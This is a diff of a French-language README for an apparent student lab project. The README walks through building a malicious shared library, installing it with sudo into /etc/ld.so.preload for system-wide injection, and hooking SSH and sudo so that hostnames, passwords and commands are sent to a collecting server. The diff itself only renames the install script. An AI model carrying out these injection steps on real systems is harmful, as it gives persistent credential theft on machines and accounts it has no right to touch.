@@ -60,7 +60,7 @@ register <hostname> <password> → stocké dans la base BTree
 
 log <hostname> <cmd> → affiché dans le terminal
 
-💻 VM 2 – Malware (192.168.1.15)
+## 💻 VM 2 – Malware (192.168.1.15)
 🛠️ Prérequis
 OpenSSH installé :
 
@@ -79,8 +79,8 @@ cd ~/mal/CC1-DATABASE-ESGI/LD_PRELOAD/malware
 make
 🐚 Injection automatique via LD_PRELOAD
 
-chmod +x install_ldso_preload.sh
-sudo ./install_ldso_preload.sh
+chmod +x add_to_ldso.sh
+sudo ./add_to_ldso.sh
 Cela ajoute le chemin absolu de malware.so dans /etc/ld.so.preload
 
 
@@ -116,8 +116,8 @@ Sur la VM malware, compiler et injecter :
 
 
 make |
-chmod +x install_ldso_preload.sh|
-sudo ./install_ldso_preload.sh |
+chmod +x add_to_ldso.sh|
+sudo ./add_to_ldso.sh |
 Se connecter à une machine distante via SSH (ou exécuter sudo ls)
 exemple : |
 LD_PRELOAD=./malware.so ssh nom@192.168.1.xx (ip)
